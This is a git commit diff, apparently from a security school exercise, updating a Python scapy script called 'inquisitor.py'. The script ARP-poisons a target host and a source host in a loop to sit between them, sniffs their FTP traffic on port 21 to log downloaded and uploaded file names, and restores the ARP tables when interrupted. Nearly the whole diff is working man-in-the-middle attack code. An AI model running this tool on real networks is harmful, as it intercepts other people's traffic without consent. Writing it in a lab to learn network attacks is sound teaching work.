25aa33c57caea747a9781c74fb83e1a316e93abe
AliHaine <alitr57120@gmail.com>
2024-11-25 03:32:20 +0100

    Add makefile, update docker file and compose. End basical inquisitor

--- 42_security_pool/p5/inquisitor.py
+++ 42_security_pool/p5/inquisitor.py
@@ -1,5 +1,6 @@
 import scapy.all as scapy
 import sys
+import time
 
 
 if len(sys.argv) < 5:
@@ -13,13 +14,22 @@ ip_target = sys.argv[3]
 mac_target = sys.argv[4]
 
 
-def spoofing(ip_dst, mac_dst, ip_src):
-	packet = scapy.ARP(op=2, hwdst=mac_dst, pdst=ip_dst, psrc=ip_src)
+def restore_spoofing():
+	print("Restoring default ARP..")
+	packet = scapy.ARP(op=2, pdst=ip_target, hwdst=mac_target, psrc=ip_src, hwsrc=mac_src)
+	scapy.send(packet, verbose=False)
+
+	packet = scapy.ARP(op=2, pdst=ip_src, hwdst=mac_src, psrc=ip_target, hwsrc=mac_target)
 	scapy.send(packet, verbose=False)
 
 
+def spoofing(ip_dst, mac_dst, ip_src):
+	arp_packet = scapy.ARP(op=2, hwdst=mac_dst, pdst=ip_dst, psrc=ip_src)
+	ethernet_frame = scapy.Ether(dst=mac_dst) / arp_packet
+	scapy.sendp(ethernet_frame, verbose=False)
+
+
 def packet_callback(packet):
-	print("enter")
 	if packet.haslayer(scapy.TCP) and packet.haslayer(scapy.Raw):
 		payload = packet[scapy.Raw].load
 		if b"RETR" in payload:
@@ -28,7 +38,12 @@ def packet_callback(packet):
 			print(f"Uploading: {payload.decode()[5:-2]}")
 
 
-while True:
-	spoofing(ip_target, mac_target, ip_src)
-	spoofing(ip_src, mac_src, ip_target)
-	scapy.sniff(iface="eth0", prn=packet_callback, filter="tcp port 21")
+scapy.sniff(iface="eth0", prn=packet_callback, filter="tcp port 21")
+
+try:
+	while True:
+		spoofing(ip_target, mac_target, ip_src)
+		spoofing(ip_src, mac_src, ip_target)
+		time.sleep(1)
+except KeyboardInterrupt:
+	restore_spoofing()
